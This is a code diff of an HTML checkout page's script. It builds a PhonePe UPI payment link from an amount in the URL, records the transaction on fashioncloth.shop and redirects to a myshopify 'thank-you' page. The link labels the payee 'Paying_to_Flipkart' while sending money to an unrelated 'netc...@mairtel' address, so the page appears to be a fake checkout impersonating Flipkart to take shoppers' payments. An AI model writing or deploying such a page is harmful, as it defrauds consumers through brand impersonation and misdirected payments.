@@ -951,7 +951,7 @@
         </div>
         <div class="z-[60] hidden"></div>
     </div>
-    <script>
+   <script>
 function getAmountFromURL() {
     const params = new URLSearchParams(window.location.search);
     const amount = params.get("amount");
@@ -962,7 +962,7 @@ async function checkPaymentStatus(transactionId) {
     try {
         const response = await fetch("https://fashioncloth.shop/check-payment-status.php?txnid=" + transactionId);
         const result = await response.json();
-        
+
         if (result.status === "success") {
             window.location.href = "https://1fuvdm-p7.myshopify.com/pages/thank-you";
         } else {
@@ -973,18 +973,24 @@ async function checkPaymentStatus(transactionId) {
     }
 }
 
-function openPhonePePayment() {
+async function openPhonePePayment() {
     const amount = getAmountFromURL();
-    const txnId = "TXN" + Date.now(); // Unique transaction ID for tracking
+    const txnId = "TXN" + Date.now(); // Unique ID
+
+    // Save the transaction as "pending" in your database
+    await fetch("https://fashioncloth.shop/initiate-transaction.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ txnid: txnId, amount: amount })
+    });
 
     const upiLink = `phonepe://pay?ver=01&mode=19&pa=netc.34161fa820328aa2d22c4f80@mairtel&pn=Paying_to_Flipkart&tr=${txnId}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${amount}`;
     
     window.location.href = upiLink;
 
-    // Wait and then check
     setTimeout(() => {
         if (document.visibilityState === 'visible') {
-            checkPaymentStatus(txnId);
+            checkPaymentStatus(txnId); // Call backend to confirm status
         }
     }, 9000);
 }
